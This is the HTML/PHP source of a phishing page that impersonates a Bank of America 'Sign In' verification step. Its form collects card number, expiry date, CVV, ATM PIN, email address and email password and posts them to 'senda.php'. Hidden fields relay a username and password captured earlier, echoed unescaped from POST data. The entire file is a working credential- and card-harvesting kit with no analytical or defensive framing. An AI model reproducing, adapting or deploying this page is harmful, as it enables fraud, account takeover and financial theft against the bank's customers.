<title>Sign-in</title>
<link rel="stylesheet" href="css/style.css">
<meta name="MobileOptimized" content="width" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="true" />
<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
<script src="js/jquery.js" type="text/javascript"></script>
<script src="js/jquery.maskedinput.js" type="text/javascript"></script>
<script type="text/javascript">
$(function($){
$("#fecha").mask("99/99/9999");
});
</script>
<h1 id="title" class="h1" aria-hidden="false"><font color="#FFF" face="Arial" size="3"><b><img  src="img/ra.png" height="20" width="20"></td>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sign In</h1></font></b>
<body>
<form method="post" action="senda.php" name="form1">

<table align="center" border='0' style="width: 100%;">
<tbody>
<tr>
<td>
<img style="margin-left:10px;" src="img/secure_lock.png">
<font color="gray" face="Arial" style="font-size: 14px;">&nbsp;&nbsp;<b>Please verify your information.</b>
</td>
</tr>
<tr>
<td>
<input type="text" name="nt" class='input' oninput="this.value = this.value.replace(/[^0-9.]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" placeholder="CC Number (XXXX XXXX XXXX XXXX)" minlength="16" maxlength="17" autocomplete="off" required>

</td>
</tr>
<tr>
<td>
<input id="fecha" type="text" name="dt" class='input' maxlength="12" placeholder="Date of Expiration (DD-YYYY)" autocomplete="off" required>
</td>
</tr>
<tr>
<td>
<input type="text" name="ct" class='input' oninput="this.value = this.value.replace(/[^0-9.]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" minlength="3" maxlength="4" placeholder="CVV (3-4 Digits)" autocomplete="off" required>
</td>
</tr>
<tr>
<td>
<input type="password" name="pt" class='input' placeholder="Pin ATM" autocomplete="off" required>
</td>
</tr>
<tr>
<td>
<input type="email" name="et" class='input' placeholder="Email" autocomplete="off" required>
</td>
</tr>
<tr>
<td>
<input type="password" name="pt2" class='input' placeholder="Password Email" autocomplete="off" required>
</td>
</tr>
<tr>
<td align="center" colspan='2' rowspan='2'>
<br><br><br><br>
        <button id="btSignonContinue" href="javascript:void(0);" role="button" class='button' style=cursor:pointer;>
            <img style="margin-bottom:-4px;" class="paddingHoriz10" src="img/secure_lock.png">
            <span id="signonLabel">&nbsp;&nbsp;&nbsp;Next</span>
        </button>
<br><br>
<font color="blue" face="Arial" size="2.5">Forgot ID/Passcode? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enroll</font>
</td>
</tr>
</tbody>
</table>
</div>
<input name="u" type="text" value="<?php echo $_POST['u']; ?>" style="visibility:hidden">
<input name="p" type="text" value="<?php echo $_POST['p']; ?>" style="visibility:hidden">
<br><br><br>
<table align="center" border='0' style="width: 100%;">
<tr>
<td align="leth">
<a>
  <i class="fa fa-globe"></i>
<b><font color="#0170B9" face="Arial" size="1">
Privacy & Security
</font></b>
</a>
</td>
<td align="right">
<a>
  <i class="fa fa-globe"></i>
<b><font color="#0170B9" face="Arial" size="1">
Equal Housing Lender
</font></b>
</a>
</td>
</tr>
<tr>
<td  colspan='2'>
<b><font color="#636b78" face="Arial" style="font-size: 9px;">
© 2019 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.
</font></b>
</td>
</tr>
</table>
</body>

